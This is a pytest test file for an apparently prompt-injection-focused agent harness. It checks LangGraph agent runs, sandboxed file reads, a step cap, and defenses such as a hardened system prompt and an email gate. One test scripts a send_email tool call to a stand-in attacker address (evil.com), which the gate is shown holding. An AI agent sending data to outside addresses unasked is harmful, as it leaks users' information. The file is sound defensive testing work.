"""Tests for the LangGraph agent implementation."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from promptbait.agent_langgraph import HAS_LANGGRAPH, run_agent_langgraph
from promptbait.defense import DefenseConfig
from promptbait.providers import BaseProvider, ChatResponse, ProviderUnavailable, ToolCall
from promptbait.tools import ToolRegistry


class DummyProvider(BaseProvider):
    def __init__(self, responses: list[ChatResponse]) -> None:
        super().__init__("dummy")
        self._responses = list(responses)
        self.calls: list[list[dict]] = []

    def chat(self, messages, tools=None, temperature=0.2):
        self.calls.append(list(messages))
        if not self._responses:
            return ChatResponse(content="fallback end")
        return self._responses.pop(0)


@pytest.mark.skipif(not HAS_LANGGRAPH, reason="langgraph not installed")
def test_langgraph_direct_answer(tmp_path: Path):
    sandbox = tmp_path / "sandbox"
    outbox = tmp_path / "outbox"
    sandbox.mkdir()
    registry = ToolRegistry(sandbox=sandbox, outbox_dir=outbox)

    provider = DummyProvider([ChatResponse(content="Hello from LangGraph agent")])
    outcome = run_agent_langgraph(
        user_task="greet",
        provider=provider,
        registry=registry,
        system_prompt="sys",
        outdir=tmp_path / "run",
    )

    assert outcome.final_answer == "Hello from LangGraph agent"
    assert outcome.hit_step_cap is False
    assert len(outcome.steps) == 1
    assert outcome.steps[0].role == "assistant"
    assert outcome.steps[0].content == "Hello from LangGraph agent"

    transcript = tmp_path / "run" / "transcript.jsonl"
    assert transcript.exists()
    lines = [json.loads(line) for line in transcript.read_text(encoding="utf-8").splitlines()]
    assert len(lines) == 1
    assert lines[0]["role"] == "assistant"


@pytest.mark.skipif(not HAS_LANGGRAPH, reason="langgraph not installed")
def test_langgraph_tool_execution(tmp_path: Path):
    sandbox = tmp_path / "sandbox"
    outbox = tmp_path / "outbox"
    sandbox.mkdir()
    test_file = sandbox / "notes.txt"
    test_file.write_text("Secret content 123", encoding="utf-8")
    registry = ToolRegistry(sandbox=sandbox, outbox_dir=outbox)

    provider = DummyProvider([
        ChatResponse(
            content=None,
            tool_calls=[ToolCall(name="read_file", arguments={"path": "notes.txt"})],
        ),
        ChatResponse(content="File contained Secret content 123"),
    ])

    outcome = run_agent_langgraph(
        user_task="read notes",
        provider=provider,
        registry=registry,
        system_prompt="sys",
        outdir=tmp_path / "run",
    )

    assert outcome.final_answer == "File contained Secret content 123"
    assert outcome.hit_step_cap is False
    assert len(outcome.tool_events) == 1
    assert outcome.tool_events[0].name == "read_file"
    assert outcome.tool_events[0].ok is True
    assert "Secret content 123" in outcome.tool_events[0].output

    transcript = tmp_path / "run" / "transcript.jsonl"
    lines = [json.loads(line) for line in transcript.read_text(encoding="utf-8").splitlines()]
    # Assistant turn (tool call) -> Tool turn -> Assistant final answer
    assert len(lines) == 3
    assert lines[0]["role"] == "assistant"
    assert lines[1]["role"] == "tool"
    assert lines[1]["tool_name"] == "read_file"
    assert lines[1]["tool_ok"] is True
    assert lines[2]["role"] == "assistant"


@pytest.mark.skipif(not HAS_LANGGRAPH, reason="langgraph not installed")
def test_langgraph_step_cap(tmp_path: Path):
    sandbox = tmp_path / "sandbox"
    outbox = tmp_path / "outbox"
    sandbox.mkdir()
    registry = ToolRegistry(sandbox=sandbox, outbox_dir=outbox)

    # Provider endlessly asks for tools
    responses = [
        ChatResponse(
            content=None,
            tool_calls=[ToolCall(name="read_file", arguments={"path": "missing.txt"})],
        )
        for _ in range(10)
    ]
    provider = DummyProvider(responses)

    outcome = run_agent_langgraph(
        user_task="loop forever",
        provider=provider,
        registry=registry,
        system_prompt="sys",
        outdir=tmp_path / "run",
        max_steps=3,
    )

    assert outcome.hit_step_cap is True
    assert outcome.final_answer is None


@pytest.mark.skipif(not HAS_LANGGRAPH, reason="langgraph not installed")
def test_langgraph_with_defense(tmp_path: Path):
    sandbox = tmp_path / "sandbox"
    outbox = tmp_path / "outbox"
    sandbox.mkdir()
    registry = ToolRegistry(sandbox=sandbox, outbox_dir=outbox)

    provider = DummyProvider([
        ChatResponse(
            content=None,
            tool_calls=[ToolCall(name="send_email", arguments={"to": "external@evil.com", "subject": "hi", "body": "test"})],
        ),
        ChatResponse(content="Email attempt complete"),
    ])

    defense = DefenseConfig(hardened_prompt=True, spotlight_tool_outputs=True, email_gate=True)
    outcome = run_agent_langgraph(
        user_task="send email",
        provider=provider,
        registry=registry,
        system_prompt="base system prompt",
        outdir=tmp_path / "run",
        defense=defense,
    )

    assert outcome.final_answer == "Email attempt complete"
    assert len(outcome.tool_events) == 1
    # Email gate held the message
    assert outcome.tool_events[0].ok is False
    assert "held for confirmation" in outcome.tool_events[0].output

    # System prompt received hardening
    sys_msg = provider.calls[0][0]["content"]
    assert "INSTRUCTION HIERARCHY" in sys_msg
